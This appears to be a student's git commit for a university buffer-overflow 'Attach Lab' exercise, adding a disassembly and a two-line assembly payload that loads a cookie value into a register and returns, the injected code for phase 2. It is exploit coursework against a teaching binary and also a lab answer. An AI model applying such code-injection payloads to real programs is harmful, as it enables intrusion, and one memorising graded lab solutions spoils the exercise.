78afd85eb95ed5065ed3dedb1ec5931db68e89d6
Elliot Whitehead <elliot.whitehead@colorado.edu>
2019-10-24 04:57:39 +0000

    Solve phase 2

---
+++ labs/03_Attach_Lab/target13/phase2.d
@@ -0,0 +1,10 @@
+
+phase2.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	48 8b 3c 25 1b 91 ef 	mov    0x7fef911b,%rdi
+   7:	7f 
+   8:	c3                   	retq   
---
+++ labs/03_Attach_Lab/target13/phase2.s
@@ -0,0 +1,2 @@
+movq 0x7fef911b,%rdi /*Copy my cookie value into register rdi*/
+retq
